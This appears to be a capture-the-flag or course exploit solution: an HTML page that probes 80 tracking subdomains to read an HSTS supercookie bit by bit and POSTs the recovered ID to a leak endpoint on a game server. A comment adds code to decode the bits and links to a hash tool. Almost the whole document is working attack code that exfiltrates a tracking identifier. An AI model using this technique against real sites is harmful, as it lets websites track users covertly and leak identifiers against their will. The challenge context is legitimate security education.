<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HSTS Attack</title>
</head>
<body>

<script>

    secret_id = [];
    for (let i = 0; i < 80; i++) {
        secret_id[i] = 0;
    }

    let charCount = 10;
    let asciiBits = 8;
    let index = 0;
    let script;

    for (let i = 0; i < charCount; i++) {
        for (let j = 0; j < asciiBits; j++) {
            console.log("(" + i + ", " + j + ")");
            script = document.createElement('script');
            script.src = "http://" + index + ".tracking.jeopardy.websec.saarland/get";
            script.onload = function() {
                if (index === 79) {
                    let data = secret_id.toString();
                    const xhr = new XMLHttpRequest();
                    xhr.open("POST", "https://gameserver.websec.saarland/leak", false);
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.send("secret=deaddeaddeaddeaddeaddeaddeaddead&data=" + data);
                }
            };
            document.body.appendChild(script);
            index++;
        }
    }

</script>

<!--

For converting bit array:

var buffer = '';
var count = 0;

for (var i = 0; i < 10; i++) {
    var bits = 0;
    for (var j = 0; j < 8; j++) {
        bits = bits * 10 + secret_id[count]
        count++
    }
    var dec = parseInt(bits, 2)
    buffer += String.fromCharCode(dec)
}

Hash calculate: https://emn178.github.io/online-tools/sha3_256.html

-->

</body>
</html>
